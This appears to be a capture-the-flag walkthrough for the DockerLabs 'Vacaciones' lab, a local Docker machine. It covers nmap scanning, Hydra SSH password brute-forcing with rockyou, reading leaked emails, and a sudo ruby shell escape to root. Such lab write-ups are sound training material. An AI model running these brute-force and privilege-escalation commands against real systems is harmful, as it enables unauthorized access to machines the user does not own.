# Vacaciones

[🔗 DockerLabs.es](https://dockerlabs.es/#/)

&#x20;[🔗](https://dockerlabs.es/#/) [How to setup a Docker Image ](https://dockerlabs.es/assets/instrucciones\_de\_uso.pdf)

<details>

<summary>CTF BootToRoot</summary>

A **CTF** (Capture The Flag) **Boot To Root** (B2R) is a type of cybersecurity challenge where participants are tasked with gaining unauthorized access to a computer system (the "Boot" part) and then obtaining and eventually capturing a specific flag or set of flags (the "Root" part). The flags could be strings of text, files, or other data that prove the participant has successfully compromised the system.

In these challenges, participants typically start with minimal information about the target system and have to use various techniques, including vulnerability analysis, exploitation, privilege escalation, and more, to gain access and ultimately root access to the system. The challenges often simulate real-world scenarios and are designed to test participants' skills in penetration testing, exploit development, reverse engineering, and other cybersecurity domains. They can be hosted online or in-person as part of cybersecurity competitions, training events, or educational exercises.

</details>

## Task 1 - Deploy the machine

Install docker.io (if you do not already have it installed) -> `sudo apt install docker.io`

Download machine from DockerLabs website and setup lab:

* `unzip vacaciones``.zip`
* `sudo bash auto_deploy.sh vacaciones.tar`

<div align="left">

<figure><img src="../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

</div>

and we obtained IP machine -> 🎯 Target IP: `172.17.0.2`

We can put the IP in the file to associate it with an easier to remember name:

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "172.17.0.2 vacaciones" >> /etc/hosts
</strong></code></pre>

Create a directory for machine on a dedicated folder and subdir containing: nmap,content,exploits,scripts

<pre class="language-bash"><code class="lang-bash"><strong>mkdir -p DockerLabs/vacaciones
</strong>cd DockerLabs/vacaciones
<strong>mkdir {nmap,content,exploits,scripts}
</strong><strong>
</strong># At the end of the Lab
CTRL + C #To stop running machine

<strong>sed -i '$ d' /etc/hosts # To clean up the last line from the /etc/hosts file
</strong><strong>
</strong># To repair potential problem during activities
sudo systemctl restart docker
sudo docker stop $(docker ps -q)
sudo docker container prune -force
</code></pre>

## Task 2 - Reconnaissance and Exploitation

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 vacaciones
64 bytes from upload (172.17.0.2): icmp_seq=1 ttl=64 time=0.086 ms
64 bytes from upload (172.17.0.2): icmp_seq=2 ttl=64 time=0.034 ms
64 bytes from upload (172.17.0.2): icmp_seq=3 ttl=64 time=0.040 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system, while Windows systems usually have a TTL of 128 secs.

### 2.1 Ports in listening and relative services

Of course, we start looking for information about our target by scanning the open ports with the nmap tool

```bash
nmap -Pn -n -p0- vacaciones
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

There're two open port (22, 80), analyze them searching more info about services version and potential vulns:

```bash
nmap -A -sVC -p 22,80 vacaciones -oN nmap/port_scan
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>Pn</td><td>no ping</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

As always we begin our exploration from port 80, where we know there is a web server, so we execute the whatweb command to extract more information and then view the content using the browser

```bash
whatweb http://vacaciones
```

<figure><img src="../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

The Apache version is older and vulnerable, we can verify it using searchsploit tool:

<div align="left">

<figure><img src="../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

</div>

<div align="left">

<figure><img src="../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

</div>

Let's display the default Apache page, there's a blank page, try analysing the source page with CTRL+U

<figure><img src="../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

We discover this information disclosure regarding two hypotetic usernames: Juan and Camilo, we'll use them later to try brute force attack via ssh (22).

<figure><img src="../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

### 2.2 Brute force hidden web directory

Continuing, we try to find potential hidden directory using gobuster:

```bash
gobuster dir -u http://vacaciones -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

<figure><img src="../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

We only find a web dir (/javascript), but going on it we haven't permission to access. &#x20;

<div align="left">

<figure><img src="../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

</div>

### 2.3 Brute force ssh credentials

Remembering that we've two pontetial username and the port 22 (SSH) opened, not knowing the password we could try a brute force attack with hydra.

I save the two usernames into a txt file: `echo -e "camilo\njuan" >> users.txt`

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt vacaciones ssh
```

<div align="left">

<figure><img src="../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

</div>

Fantastic, we discovered the password, we use it to log in via SSH with the following command: `ssh camilo@vacaciones`

<div align="left">

<figure><img src="../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

</div>

## Task 3 - Privilege Escalation

Now that we are inside, since we are not root user we need to elevate our privileges, but we can't retrieve good info using `sudo -l` because we're not into sudoers

<div align="left">

<figure><img src="../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

</div>

Remember the information disclosure, we try to find email locally `find / -type f -name "*.txt" 2>/dev/null`

<div align="left">

<figure><img src="../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

</div>

and we retrieve the mail message that we are searching.

<div align="left">

<figure><img src="../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

</div>

We know that ther're three users, then we can try to log in with each

&#x20;![](<../.gitbook/assets/image (282).png>)

<div align="left">

<figure><img src="../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

</div>

Very good, password works for juan!

And user `sudo -l` we see that juan user has root permissions for /usr/bin/ruby, then we can use [gtfobins](https://gtfobins.github.io/gtfobins/ruby/) to find it.

{% embed url="https://gtfobins.github.io/gtfobins/ruby/" %}

<figure><img src="../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

using ruby sudo command, we obtain a root permission `sudo ruby -e 'exec "/bin/sh"'`

<div align="left">

<figure><img src="../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

</div>
